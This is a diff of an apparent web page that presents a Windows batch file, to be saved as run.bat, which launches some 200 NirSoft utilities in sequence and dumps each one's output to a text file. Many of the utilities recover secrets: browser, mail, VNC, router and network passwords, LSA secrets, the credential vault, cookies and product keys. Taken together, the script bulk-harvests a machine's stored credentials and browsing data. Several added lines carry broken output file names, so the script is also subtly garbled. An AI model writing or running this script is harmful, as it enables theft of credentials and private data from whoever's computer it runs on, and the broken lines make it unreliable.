@@ -36,215 +36,212 @@ start webcookiessniffer.exe /stext webcookiessniffer.txt <br>
 start webcamimagesave.exe /stext webcamimagesave.txt <br>
 start webcacheimageinfo.exe /stext webcacheimageinfo.txt <br>
 start webbrowserpassview.exe /stext webbrowserpassview.txt <br>
-start wakemeonlan.exe /stext wakemeonlan.txt
-start volumouse.exe /stext volumouse.txt
-start vncpassview.exe /stext vncpassview.txt
-start videocacheview.exe /stext videocacheviewvideocacheview.txt
-start vaultpasswordview.exe /stext vaultpasswordview.txt
-start userprofilesview.exe /stext userprofilesview.txt
-start userassistview.exe /stext userassistview.txt
-start usblogview.exe /stext usblogview.txt
-start usbdeview.exe /stext usbdeview.txt
-start urlstringgrabber.exe /stext urlstringgrabber.txt
-start urlprotocolview.exe /stext urlprotocolview.txt
-start uninstallview.exe /stext uninstallview.txt
-start turnedontimesview.exe /stext turnedontimesview.txt
-start timezonesview.exe /stext timezonesview.txt
-start tcplogview.exe /stext tcplogview.txt
-start taskschedulerview.exe /stext taskschedulerview.txt
-start tabletextcompare.exe /stext tabletextcompare.txt
-start sysexp.exe /stext sysexp.txt
-start specialfoldersview.exe /stext specialfoldersview.txt
-start soundvolumeview.exe /stext soundvolumeview.txt
-start socketsniff.exe /stext socketsniff.txt
-start sniffpass.exe /stext sniffpass.txt
-start smsniff.exe /stext smsniff.txt
-start skypelogview.exe /stext skypelogview.txt
-start skypecontactsview.exe /stext skypecontactsview.txt
-start siteshoter.exe /stext siteshoter.txt
-start simplewmiview.exe /stext simplewmiview.txt
-start simpleprogramdebugger.exe /stext simpleprogramdebugger.txt
-start shmnview.exe /stext shmnview.txt
-start shman.exe /stext shman.txt
-start shexview.exe /stext shexview.txt
-start shellmenunew.exe /stext shellmenunew.txt
-start shellbagsview.exe /stext shellbagsview.txt
-start shadowcopyview.exe /stext shadowcopyview.txt
-start serviwin.exe /stext serviwin.txt
-start seqdownload.exe /stext seqdownload.txt
-start securitysoftview.exe /stext securitysoftview.txt
-start securityquestionsview.exe /stext securityquestionsview.txt
-start searchmyfiles.exe /stext searchmyfiles.txt
-start searchfilterview.exe /stext searchfilterview.txt
-start safarihistoryview.exe /stext safarihistoryview.txt
-start safaricacheview.exe /stext safaricacheview.txt
-start runfromprocess.exe /stext runfromprocess.txt
-start runasdate.exe /stext runasdate.txt
-start rtmpdumphelper.exe /stext rtmpdumphelper.txt
-start routerpassview.exe /stext routerpassview.txt
-start resourcesextract.exe /stext resourcesextract.txt
-start regscanner.exe /stext regscanner.txt
-start registrychangesview.exe /stext registrychangesview.txt
-start regfromapp.exe /stext regfromapp.txt
-start regfileexport.exe /stext regfileexport.txt
-start regdllview.exe /stext regdllview.txt
-start recentfilesview.exe /stext recentfilesview.txt
-start rdpv.exe /stext rdpv.txt
-start quicksetdns.exe /stext quicksetdns.txt
-start pstpassword.exe /stext pstpassword.txt
-start pspv.exe /stext pspv.txt
-start propertysystemview.exe /stext propertysystemview.txt
-start produkey.exe /stext produkey.txt
-start processthreadsview.exe /stext processthreadsview.txt
-start processtcpsummary.exe /stext processtcpsummary.txt
-start processactivityview.exe /stext processactivityview.txt
-start previousfilesrecovery.exe /stext previousfilesrecovery.txt
-start pinginfoview.exe /stext pinginfoview.txt
-start pcanypass.exe /stext pcanypass.txt
-start passwordscan.exe /stext passwordscan.txt
-start passwordfox.exe /stext passwordfox.txt
-start outlookstatview.exe /stext outlookstatview.txt
-start outlookattachview.exe /stext outlookattachview.txt
-start outlookaddressbookview.exe /stext outlookaddressbookview.txt
-start operapassview.exe /stext operapassview.txt
-start operacacheview.exe /stext operacacheview.txt
-start openwithview.exe /stext openwithview.txt
-start opensavefilesview.exe /stext opensavefilesview.txt
-start openedfilesview.exe /stext openedfilesview.txt
-start offlineregistryview.exe /stext offlineregistryview.txt
-start offlineregistryfinder.exe /stext offlineregistryfinder.txt
-start officeins.exe /stext officeins.txt
-start ntfslinksview.exe /stext ntfslinksview.txt
-start nk2edit.exe /stext nk2edit.txt
-start nircmdc.exe /stext nircmdc.txt
-start nircmd.exe /stext nircmd.txt
-start networkusageview.exe /stext networkusageview.txt
-start networktrafficview.exe /stext networktrafficview.txt
-start networkopenedfiles.exe /stext networkopenedfiles.txt
-start networklatencyview.exe /stext networklatencyview.txt
-start networkinterfacesview.exe /stext networkinterfacesview.txt
-start networkcounterswatch.exe /stext networkcounterswatch.txt
-start networkconnectlog.exe /stext networkconnectlog.txt
-start netrouteview.exe /stext netrouteview.txt
-start netresview.exe /stext netresview.txt
-start netpass.exe /stext netpass.txt
-start netconnectchoose.exe /stext netconnectchoose.txt
-start netbscanner.exe /stext netbscanner.txt
-start mzcv.exe /stext mzcv.txt
-start mzcacheview.exe /stext mzcacheview.txt
-start mylastsearch.exe /stext mylastsearch.txt
-start myeventviewer.exe /stext myeventviewer.txt
-start mweather.exe /stext mweather.txt
-start multimonitortool.exe /stext multimonitortool.txt
-start muicacheview.exe /stext muicacheview.txt
-start mspass.exe /stext mspass.txt
-start mozillahistoryview.exe /stext mozillahistoryview.txt
-start monitorinfoview.exe /stext monitorinfoview.txt
-start mobilefilesearch.exe /stext mobilefilesearch.txt
-start mmcsnapinsview.exe /stext mmcsnapinsview.txt
-start mailpv.exe /stext mailpv.txt
-start macaddressview.exe /stext macaddressview.txt
-start lsasecretsview.exe /stext lsasecretsview.txt
-start lsasecretsdump.exe /stext lsasecretsdump.txt
-start loadeddllsview.exe /stext loadeddllsview.txt
-start livetcpudpwatch.exe /stext livetcpudpwatch.txt
-start livecontactsview.exe /stext livecontactsview.txt
-start lastactivityview.exe /stext lastactivityview.txt
-start keyboardstateview.exe /stext keyboardstateview.txt
-start jumplistsview.exe /stext jumplistsview.txt
-start ipnetinfo.exe /stext ipnetinfo.txt
-start ipinfooffline.exe /stext ipinfooffline.txt
-start installedpackagesview.exe /stext installedpackagesview.txt
-start installeddriverslist.exe /stext installeddriverslist.txt
-start installedcodec.exe /stext installedcodec.txt
-start installedappview.exe /stext installedappview.txt
-start insideclipboard.exe /stext insideclipboard.txt
-start imagecacheviewer.exe /stext imagecacheviewer.txt
-start iepv.exe /stext iepv.txt
-start iehv.exe /stext iehv.txt
-start iecv.exe /stext iecv.txt
-start iecacheview.exe /stext iecacheview.txt
-start iconsext.exe /stext iconsext.txt
-start htmldocedit.exe /stext htmldocedit.txt
-start htmlastext.exe /stext htmlastext.txt
-start hotkeyslist.exe /stext hotkeyslist.txt
-start hostednetworkstarter.exe /stext hostednetworkstarter.txt
-start heapmemview.exe /stext heapmemview.txt
-start hashmyfiles.exe /stext hashmyfiles.txt
-start handlecountersview.exe /stext handlecountersview.txt
-start guipropview.exe /stext guipropview.txt
-start getnir.exe /stext getnir.txt
-start gdiview.exe /stext gdiview.txt
-start fulleventlogview.exe /stext fulleventlogview.txt
-start foldertimeupdate.exe /stext foldertimeupdate.txt
-start folderchangesview.exe /stext folderchangesview.txt
-start flashcookiesview.exe /stext flashcookiesview.txt
-start firmwaretablesview.exe /stext firmwaretablesview.txt
-start firefoxdownloadsview.exe /stext firefoxdownloadsview.txt
-start filetypesman.exe /stext filetypesman.txt
-start fileactivitywatch.exe /stext fileactivitywatch.txt
-start fileaccesserrorview.exe /stext fileaccesserrorview.txt
-start fbcacheview.exe /stext fbcacheview.txt
-start faview.exe /stext faview.txt
-start fastresolver.exe /stext fastresolver.txt
-start exifdataview.exe /stext exifdataview.txt
-start executedprogramslist.exe /stext executedprogramslist.txt
-start eventlogsourcesview.exe /stext eventlogsourcesview.txt
-start eventlogchannelsview.exe /stext eventlogchannelsview.txt
-start esedatabaseview.exe /stext esedatabaseview.txt
-start encryptedregview.exe /stext encryptedregview.txt
-start edgecookiesview.exe /stext edgecookiesview.txt
-start dumpedid.exe /stext dumpedid.txt
-start driverview.exe /stext driverview.txt
-start driveletterview.exe /stext driveletterview.txt
-start downtester.exe /stext downtester.txt
-start dotnetresourcesextract.exe /stext dotnetresourcesextract.txt
-start domainhostingview.exe /stext domainhostingview.txt
-start dnsquerysniffer.exe /stext dnsquerysniffer.txt
-start dnsdataview.exe /stext dnsdataview.txt
-start dllexp.exe /stext dllexp.txt
-start disksmartview.exe /stext disksmartview.txt
-start diskcountersview.exe /stext diskcountersview.txt
-start dialupass.exe /stext dialupass.txt
-start devmanview.exe /stext devmanview.txt
-start deviceioview.exe /stext deviceioview.txt
-start dataprotectiondecryptor.exe /stext dataprotectiondecryptor.txt
-start customexplorertoolbar.exe /stext customexplorertoolbar.txt
-start ctie.exe /stext ctie.txt
-start csvfileview.exe /stext csvfileview.txt
-start credentialsfileview.exe /stext credentialsfileview.txt
-start cprocess.exe /stext cprocess.txt
-start cports.exe /stext cports.txt
-start countrytraceroute.exe /stext countrytraceroute.txt
-start controlmymonitor.exe /stext controlmymonitor.txt
-start clipboardic.exe /stext clipboardic.txt
-start cleanafterme.exe /stext cleanafterme.txt
-start chromepass.exe /stext chromepass.txt
-start chromehistoryview.exe /stext chromehistoryview.txt
-start chromecookiesview.exe /stext chromecookiesview.txt
-start chromecacheview.exe /stext chromecacheview.txt
-start bulletspassview.exe /stext bulletspassview.txt
-start bulkfilechanger.exe /stext bulkfilechanger.txt
-start browsinghistoryview.exe /stext browsinghistoryview.txt
-start browserdownloadsview.exe /stext browserdownloadsview.txt
-start browseraddonsview.exe /stext browseraddonsview.txt
-start bluetoothview.exe /stext bluetoothview.txt
-start bluetoothlogview.exe /stext bluetoothlogview.txt
-start bluetoothcl.exe /stext bluetoothcl.txt
-start bluescreenview.exe /stext bluescreenview.txt
-start batteryinfoview.exe /stext batteryinfoview.txt
-start axhelper.exe /stext axhelper.txt
-start awatch.exe /stext awatch.txt
-start appreadwritecounter.exe /stext appreadwritecounter.txt
-start appnetworkcounter.exe /stext appnetworkcounter.txt
-start appcrashview.exe /stext appcrashview.txt
-start appcompatibilityview.exe /stext appcompatibilityview.txt
-start appaudioconfig.exe /stext appaudioconfig.txt
-start altstreamdump.exe /stext altstreamdump.txt
-start alternatestreamview.exe /stext alternatestreamview.txt
-start allthreadsview.exe /stext allthreadsview.txt
-start advancedrun.exe /stext advancedrun.txt
-}
+start wakemeonlan.exe /stext wakemeonlan.txt <br>
+start volumouse.exe /stext volumouse.txt <br>
+start vncpassview.exe /stext vncpassview.txt <br>
+start videocacheview.exe /stext videocacheviewvideocacheview.txt <br>
+start vaultpasswordview.exe /stext vaultpasswordview.txt <br>
+start userprofilesview.exe /stext userprofilesview.txt <br>
+start userassistview.exe /stext userassistview.txt <br>
+start usblogview.exe /stext usblogview.txt <br>
+start usbdeview.exe /stext usbdeview.txt <br>
+start urlstringgrabber.exe /stext urlstringgrabber.txt <br>
+start urlprotocolview.exe /stext urlprotocolview.txt <br>
+start uninstallview.exe /stext uninstallview.txt <br>
+start turnedontimesview.exe /stext turnedontimesview.txt <br>
+start timezonesview.exe /stext timezonesview.txt <br>
+start tcplogview.exe /stext tcplogview.txt <br>
+start taskschedulerview.exe /stext taskschedulerview.txt <br>
+start tabletextcompare.exe /stext tabletextcompare.txt <br>
+start sysexp.exe /stext sysexp.txt <br>
+start specialfoldersview.exe /stext specialfoldersview.txt <br>
+start soundvolumeview.exe /stext soundvolumeview.txt <br>
+start socketsniff.exe /stext socketsniff.txt <br>
+start sniffpass.exe /stext sniffpass.txt <br>
+start smsniff.exe /stext smsniff.txt <br>
+start skypelogview.exe /stext skypelogview.txt <br>
+start skypecontactsview.exe /stext skypecontactsview.txt <br>
+start siteshoter.exe /stext siteshoter.txt <br>
+start simplewmiview.exe /stext simplewmiview.txt <br>
+start simpleprogramdebugger.exe /stext simpleprogramdebugger.txt <br>
+start shmnview.exe /stext shmnview.txt <br>
+start shman.exe /stext shman.txt <br>
+start shexview.exe /stext shexview.txt <br>
+start shellmenunew.exe /stext shellmenunew.txt <br>
+start shellbagsview.exe /stext shellbagsview.txt <br>
+start shadowcopyview.exe /stext shadowcopyview.txt <br>
+start serviwin.exe /stext serviwin.txt <br>
+start seqdownload.exe /stext seqdownload.txt <br>
+start securitysoftview.exe /stext securitysoftview.txt <br>
+start securityquestionsview.exe /stext securityquestionsview.txt <br>
+start searchmyfiles.exe /stext searchmyfiles.txt <br>
+start searchfilterview.exe /stext searchfilterview.txt <br>
+start safarihistoryview.exe /stext safarihistoryview.txt <br>
+start safaricacheview.exe /stext safaricacheview.txt <br>
+start runfromprocess.exe /stext runfromprocess.txt <br>
+start runasdate.exe /stext runasdate.txt <br>
+start rtmpdumphelper.exe /stext rtmpdumphelper.txt <br>
+start routerpassview.exe /stext routerpassview.txt <br>
+start resourcesextract.exe /stext resourcesextract.txt <br>
+start regscanner.exe /stext regscanner.txt <br>
+start registrychangesview.exe /stext registrychangesview.txt <br>
+start regfromapp.exe /stext regfromapp.txt <br>
+start regfileexport.exe /stext regfileexport.txt <br>
+start regdllview.exe /stext regdllview.txt <br>
+start recentfilesview.exe /stext recentfilesview.txt <br>
+start rdpv.exe /stext rdpv.txt <br>
+start quicksetdns.exe /stext quicksetdns.txt <br>
+start pstpassword.exe /stext pstpassword.txt <br>
+start pspv.exe /stext pspv.txt <br>
+start propertysystemview.exe /stext propertysystemview.txt <br>
+start produkey.exe /stext produkey.txt <br>
+start processthreadsview.exe /stext processthreadsview.txt <br>
+start processtcpsummary.exe /stext processtcpsummary.txt <br>
+start processactivityview.exe /stext processactivityview.txt <br>
+start previousfilesrecovery.exe /stext previousfilesrecovery.txt <br>
+start pinginfoview.exe /stext pinginfoview.txt <br>
+start pcanypass.exe /stext pcanypass.txt <br>
+start passwordscan.exe /stext passwordscan.txt <br>
+start passwordfox.exe /stext passwordfox.txt <br>
+start outlookstatview.exe /stext outlookstatview.txt <br>
+start outlookattachview.exe /stext outlookattachview.txt <br>
+start outlookaddressbookview.exe /stext outlookaddressbookview.txt <br>
+start operapassview.exe /stext operapassview.txt <br>
+start operacacheview.exe /stext operacacheview.txt <br>
+start openwithview.exe /stext openwithview.txt <br>
+start opensavefilesview.exe /stext opensavefilesview.txt <br>
+start openedfilesview.exe /stext openedfilesview.txt <br>
+start offlineregistryview.exe /stext offlineregistryview.txt <br>
+start offlineregistryfinder.exe /stext offlineregistryfinder.txt <br>
+start officeins.exe /stext officeins.txt <br>
+start ntfslinksview.exe /stext ntfslinksview.txt <br>
+start nk2edit.exe /stext nk2edit.txt <br>
+start nircmdc.exe /stext nircmdc.txt <br>
+start nircmd.exe /stext nircmd.txt <br>
+start networkusageview.exe /stext networkusageview. <br>
+start networktrafficview.exe /stext networktrafficview.txt <br>
+start networkopenedfiles.exe /stext networkopenedfiles.txt <br>
+start networklatencyview.exe /stext networklatencyview.txt <br>
+start networkinterfacesview.exe /stext networkinterfacesview.txt <br>
+start networkcounterswatch.exe /stext networkcounterswatch.txt <br>
+start networkconnectlog.exe /stext networkconnectlog.txt <br>
+start netrouteview.exe /stext netrouteview.txt <br>
+start netresview.exe /stext netresview.txt <br>
+start netpass.exe /stext netpass.txt <br>
+start netconnectchoose.exe /stext netconnectchoose.txt <br>
+start netbscanner.exe /stext netbscanner.txt <br>
+start mzcv.exe /stext mzcv.txt <br>
+start mzcacheview.exe /stext mzcacheview.txt <br>
+start mylastsearch.exe /stext mylastsearch.txt <br>
+start myeventviewer.exe /stext myeventviewer.txt <br>
+start mweather.exe /stext mweather.txt <br>
+start multimonitortool.exe /stext multimonitortool.txt <br>
+start muicacheview.exe /stext muicacheview.txt <br>
+start mspass.exe /stext mspass.txt <br>
+start mozillahistoryview.exe /stext mozillahistoryview.txt <br>
+start monitorinfoview.exe /stext monitorinfoview.txt <br>
+start mobilefilesearch.exe /stext mobilefilesearch.txt <br>
+start mmcsnapinsview.exe /stext mmcsnapinsview.txt <br>
+start mailpv.exe /stext mailpv.txt <br>
+start macaddressview.exe /stext macaddressview.txt <br>
+start lsasecretsview.exe /stext lsasecretsview.txt <br>
+start lsasecretsdump.exe /stext lsasecretsdump.txt <br>
+start loadeddllsview.exe /stext loadeddllsview.txt <br>
+start livetcpudpwatch.exe /stext livetcpudpwatch.txt <br>
+start livecontactsview.exe /stext livecontactsview.txt <br>
+start lastactivityview.exe /stext lastactivityview.txt <br>
+start keyboardstateview.exe /stext keyboardstateview.txt <br>
+start jumplistsview.exe /stext jumplistsview.txt <br>
+start ipnetinfo.exe /stext ipnetinfo.txt <br>
+start installedpackagesview.exe /stext installedpackagesview.txt <br>
+start installeddriverslist.exe /stext installeddriverslist.txt <br>
+start installedcodec.exe /stext installedcodec.txt <br>
+start installedappview.exe /stext installedappview.txt <br>
+start insideclipboard.exe /stext insideclipboard.txt <br>
+start imagecacheviewer.exe /stext imagecacheviewer.txt <br>
+start iepv.exe /stext iepv.txt <br>
+start iehv.exe /stext iehv.txt <br>
+start iecv.exe /stext iecv.txt <br>
+start iecacheview.exe /stext iecacheview.txt <br>
+start iconsext.exe /stext iconsext.txt <br>
+start htmldocedit.exe /stext htmldocedit.txt <br>
+start htmlastext.exe /stext htmlastext.txt <br>
+start hotkeyslist.exe /stext hotkeyslist.txt <br>
+start hostednetworkstarter.exe /stext hostednetworkstarter.txt <br>
+start heapmemview.exe /stext heapmemview.txt <br>
+start hashmyfiles.exe /stext hashmyfiles.txt <br>
+start handlecountersview.exe /stext handlecountersview.txt <br>
+start guipropview.exe /stext guipropview.txt <br>
+start getnir.exe /stext getnir.txt <br>
+start gdiview.exe /stext gdiview. <br>
+start fulleventlogview.exe /stext fulleventlogview.txt <br>
+start foldertimeupdate.exe /stext foldertimeupdate.txt <br>
+start folderchangesview.exe /stext folderchangesview.txt <br>
+start flashcookiesview.exe /stext flashcookiesview.txt <br>
+start firmwaretablesview.exe /stext firmwaretablesview.txt <br>
+start firefoxdownloadsview.exe /stext firefoxdownloadsview. <br>
+start filetypesman.exe /stext filetypesman.txt <br>
+start fileactivitywatch.exe /stext fileactivitywatch.txt <br>
+start fileaccesserrorview.exe /stext fileaccesserrorview.txt <br>
+start fbcacheview.exe /stext fbcacheview.txt <br>
+start fastresolver.exe /stext fastresolver. <br>
+start executedprogramslist.exe /stext executedprogramslist.txt <br>
+start eventlogsourcesview.exe /stext eventlogsourcesview.txt <br>
+start eventlogchannelsview.exe /stext eventlogchannelsview.txt <br>
+start esedatabaseview.exe /stext esedatabaseview.txt <br>
+start encryptedregview.exe /stext encryptedregview.txt <br>
+start edgecookiesview.exe /stext edgecookiesview.txt <br>
+start dumpedid.exe /stext dumpedid.txt <br>
+start driverview.exe /stext driverview.txt <br>
+start driveletterview.exe /stext driveletterview.txt <br>
+start downtester.exe /stext downtester.txt <br>
+start dotnetresourcesextract.exe /stext dotnetresourcesextract.txt <br>
+start domainhostingview.exe /stext domainhostingview.txt <br>
+start dnsquerysniffer.exe /stext dnsquerysniffer.txt <br>
+start dnsdataview.exe /stext dnsdataview.txt <br>
+start dllexp.exe /stext dllexp.txt <br>
+start disksmartview.exe /stext disksmartview.txt <br>
+start diskcountersview.exe /stext diskcountersview.txt <br>
+start dialupass.exe /stext dialupass.txt <br>
+start devmanview.exe /stext devmanview.txt <br>
+start deviceioview.exe /stext deviceioview.txt <br>
+start dataprotectiondecryptor.exe /stext dataprotectiondecryptor.txt <br>
+start customexplorertoolbar.exe /stext customexplorertoolbar.txt <br>
+start ctie.exe /stext ctie.txt <br>
+start csvfileview.exe /stext csvfileview.txt <br>
+start credentialsfileview.exe /stext credentialsfileview.txt <br>
+start cprocess.exe /stext cprocess.txt <br>
+start cports.exe /stext cports.txt <br>
+start countrytraceroute.exe /stext countrytraceroute.txt <br>
+start controlmymonitor.exe /stext controlmymonitor.txt <br>
+start clipboardic.exe /stext clipboardic.txt <br>
+start cleanafterme.exe /stext cleanafterme.txt <br>
+start chromepass.exe /stext chromepass.txt <br>
+start chromehistoryview.exe /stext chromehistoryview.txt <br>
+start chromecookiesview.exe /stext chromecookiesview.txt <br>
+start chromecacheview.exe /stext chromecacheview.txt <br>
+start bulletspassview.exe /stext bulletspassview.txt <br>
+start bulkfilechanger.exe /stext bulkfilechanger.txt <br>
+start browsinghistoryview.exe /stext browsinghistoryview.txt <br>
+start browserdownloadsview.exe /stext browserdownloadsview.txt <br>
+start browseraddonsview.exe /stext browseraddonsview.txt <br>
+start bluetoothview.exe /stext bluetoothview.txt <br>
+start bluetoothlogview.exe /stext bluetoothlogview.txt <br>
+start bluetoothcl.exe /stext bluetoothcl.txt <br>
+start bluescreenview.exe /stext bluescreenview.txt <br>
+start batteryinfoview.exe /stext batteryinfoview.txt <br>
+start axhelper.exe /stext axhelper.txt <br>
+start awatch.exe /stext awatch.txt <br>
+start appreadwritecounter.exe /stext appreadwritecounter.txt <br>
+start appnetworkcounter.exe /stext appnetworkcounter.txt <br>
+start appcrashview.exe /stext appcrashview.txt <br>
+start appcompatibilityview.exe /stext appcompatibilityview.txt <br>
+start appaudioconfig.exe /stext appaudioconfig. <br>
+start altstreamdump.exe /stext altstreamdump.txt <br>
+start alternatestreamview.exe /stext alternatestreamview.txt <br>
+start allthreadsview.exe /stext allthreadsview.txt <br>
+start advancedrun.exe /stext advancedrun.txt <br>
+} <br>
 </html>
 
 save the program as run.bat
